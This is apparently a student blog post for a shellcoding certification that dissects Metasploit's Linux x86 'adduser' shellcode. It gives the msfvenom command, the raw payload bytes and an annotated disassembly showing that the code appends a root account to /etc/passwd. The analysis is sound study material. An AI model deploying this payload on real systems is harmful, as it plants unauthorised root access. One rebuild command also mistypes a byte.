# Analyze: Add User

# Create shellcode
```bash
msfvenom -p linux/x86/adduser -f c USER=username PASS=pass123
```

The output of this command is shellcode that will create a user with the username of 'username' and a password of 'pass123'.

# Analysis

## Disassemble w/ bash
```bash
echo -n "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x26\x00\x00\x00\x75\x73\x65\x72\x6e\x61\x6d\x65\x3a\x41\x7a\x79\x64\x77\x66\x6f\x69\x67\x42\x54\x72\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```

## Disassembled Assembly

```assembly
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E826000000        call 0x51
0000002B  7573              
0000002D  65726E            
00000030  61                popa
00000031  6D                insd
00000032  653A417A          cmp al,[gs:ecx+0x7a]
00000036  7964              jns 0x9c
00000038  7766              ja 0xa0
0000003A  6F                outsd
0000003B  6967425472733A    imul esp,[edi+0x42],dword 0x3a737254
00000042  303A              xor [edx],bh
00000044  303A              xor [edx],bh
00000046  3A2F              cmp ch,[edi]
00000048  3A2F              cmp ch,[edi]
0000004A  62696E            bound ebp,[ecx+0x6e]
0000004D  2F                das
0000004E  7368              jnc 0xb8
00000050  0A598B            or bl,[ecx-0x75]
00000053  51                push ecx
00000054  FC                cld
00000055  6A04              push byte +0x4
00000057  58                pop eax
00000058  CD80              int 0x80
0000005A  6A01              push byte +0x1
0000005C  58                pop eax
0000005D  CD80              int 0x80
```

Here I will dissect the assembly piece by piece, followed by a commented version of the code in its entirety.


## Assembly review

First the shellcode will xor `ecx` with itself to clear it's value and move that into `ebx` to also set ebx to 0. 

It will then push `0x46` to the stack and pop that off into `eax`. 0x46 is the number 70 in decimal, which corresponds to the syscall for `setreuid()`.

The [setreuid()](https://man7.org/linux/man-pages/man2/setreuid.2.html) function definition looks like this:

```c
int setreuid(uid_t ruid, uid_t euid);
```

So, in essense this function is getting called with a 0 for both parameters. This sets the real and effective id of the executing process to 0, which is the root user. This is what gives the privledges necessary to create a user in the upcoming instructions.

The shellcode for this sequence looks like this:

```assembly
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax             ; 0x46 from stack
    ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 70$"
    ; setreuid()
    ; int setreuid(uid_t ruid, uid_t euid);
00000007  CD80              int 0x80
```

Next a 0x5 is pushed to the stack and poped into eax. This corresponds to the [open()](https://man7.org/linux/man-pages/man2/open.2.html) function with the following definition:
```c
int open(const char *pathname, int flags);
``` 

Next the string for the path will be pushed to the stack. To do this, `eax` is cleared and pushed to the stack to act as the string null terminator. Then the string is pushed to the stack in reverse order in chunks of size `word` to avoid null bytes being placed on the stack. To do this, the string being pushed must have a length of characters that is divisable by 4. In order to accomplish this, the string "/etc/passwd" (11 characters) is pushed as "/etc//passwd" (12 characters) and will be normalized by the operation system when open() is called. 

Once the stack has the filepath pushed to it, a pointer to the stack is moved into `ebx` to act as the first parameter to the open() function. 

Then ecx is incremented by 1 and 0x4 is moved into `ch`, which is bits 8-16 from the least significant bit, meaning the 1 that was pushed is not overwritten. Thus, the new value is `0x401` which corresponds to the flags value of (O_WRONLY|O_APPEND), thus the shellcode has write permissions to the /etc/passwd file to write a new user.

Then the syscall is triggered. The return value is then moved from `eax` into `ebx` and contains a pointer to the file.

The full shellcode for this segment is listed below:

```assembly
00000009  6A05              push byte +0x5
0000000B  58                pop eax             ; 0x5 from stack
    ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5$"
    ; open ()
    ; int open(const char *pathname, int flags);
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373   ; (ascii) dwss
00000014  682F2F7061        push dword 0x61702f2f   ; (ascii) ap//
00000019  682F657463        push dword 0x6374652f   ; (ascii) cte/
0000001E  89E3              mov ebx,esp             ; /etc//passwd
00000020  41                inc ecx                 ; ecx = 1
00000021  B504              mov ch,0x4              ; ecx = 0x401 (O_WRONLY|O_APPEND)
00000023  CD80              int 0x80                ; open("/etc//passwd", 0x0401)
00000025  93                xchg eax,ebx            ; ebx = ptr to file
```

Now it's time to actually write to the file that was just opened. 

The next instruction is a call to the 0x51 position. This will place a pointer to the next address of `0000002B` onto the stack. This is actually a string in hex form, however, the disassembler didn't know that when it was disassembling. Thus, instructions look twisted in the original disassembly. I will decode the hex value as a string and remove the instructions that aren't actually instrucitons. 

I will then run this command to rebuild the remaining instructions starting from the proper offset.

```bash
echo -n "`python2 -c 'print "\x90"*81'`\x59\x8b\x51\xfc\x61\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -p intel - | grep -v nop
```

First, the call and string:

```assembly
00000026  E826000000        call 0x51               ; call label1 


0000002B  757365726E616D653A417A796477666F6967425472733A303A303A3A2F3A2F62696E2F73680A
; (ascii) username:AzydwfoigBTrs:0:0::/:/bin/sh
```

Thus, the string `username:AzydwfoigBTrs:0:0::/:/bin/sh` will be written to `/etc/passwd`. This corresponds to the username of `username` and the hash of the password `pass123`.

Then the newly disassembled instructions:

```assembly
label1:             
00000051  59                pop ecx             ; ptr to 0x2b (string to write)
00000052  8B51FC            mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
00000055  6A04              push byte +0x4      ; 
00000057  58                pop eax             ; write()
00000058  CD80              int 0x80            ; ssize_t write(int fd, const void *buf, size_t count);



0000005A  6A01              push byte +0x1      
0000005C  58                pop eax             
0000005D  CD80              int 0x80            ; exit()
```

These remaining instructions pop the value on the stack (pointer to the string) into `ecx`, then it moves `[ecx-0x4]` into `edx`. This instruction is interesting. It is using the opcode from `0x2b - 0x4` which is `0x27`. This is the number `0x26` from this call line:

```assembly
00000026  E826000000        call 0x51               ; call label1 
```

This parameter is the length of the string to read. Quite an interesting instruction for an automated tool to write, very clever. 

The next instructions just move the [write()](https://man7.org/linux/man-pages/man2/write.2.html) syscall enumerator value of 0x4 into `eax` and executes the syscall.

Finally a value of `0x1` is moved into `eax` by pushing it to the stack and popping it off into the register. A syscall is executed to gracefully [exit()](https://man7.org/linux/man-pages/man3/exit.3.html) the shellcode with the status code of 1. 

## Disassembled (Cleaned and commented)

Here I have cleaned and commented the code in its entirety:

```assembly
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax             ; 0x46 from stack
    ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 70$"
    ; setreuid()
    ; int setreuid(uid_t ruid, uid_t euid);
00000007  CD80              int 0x80




00000009  6A05              push byte +0x5
0000000B  58                pop eax             ; 0x5 from stack
    ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 5$"
    ; open ()
    ; int open(const char *pathname, int flags);
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373   ; (ascii) dwss
00000014  682F2F7061        push dword 0x61702f2f   ; (ascii) ap//
00000019  682F657463        push dword 0x6374652f   ; (ascii) cte/
0000001E  89E3              mov ebx,esp             ; /etc//passwd
00000020  41                inc ecx                 ; ecx = 1
00000021  B504              mov ch,0x4              ; ecx = 0x401 (O_WRONLY|O_APPEND)
00000023  CD80              int 0x80                ; open("/etc//passwd", 0x0401)



00000025  93                xchg eax,ebx            ; ebx = ptr to file
00000026  E826000000        call 0x51               ; call label1 


0000002B  757365726E616D653A417A796477666F6967425472733A303A303A3A2F3A2F62696E2F73680A
; (ascii) username:AzydwfoigBTrs:0:0::/:/bin/sh

label1:             
; rebuilt with `echo -n "`python2 -c 'print "\x90"*81'`\x59\x8b\x51\xfc\x61\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -p intel -`
00000051  59                pop ecx             ; ptr to 0x2b
00000052  8B51FC            mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
00000055  6A04              push byte +0x4      ; 
00000057  58                pop eax             ; write()
00000058  CD80              int 0x80            ; ssize_t write(int fd, const void *buf, size_t count);



0000005A  6A01              push byte +0x1      
0000005C  58                pop eax             
0000005D  CD80              int 0x80            ; exit()
```

# Certification Requirements

This blog post has been created for completing the requirements of the SecurityTube/PentesterAcademy [x86 Assembly Language and Shellcoding on Linux (SLAE)](https://www.pentesteracademy.com/course?id=3) certification:

Student ID: SLAE-alecjmaly
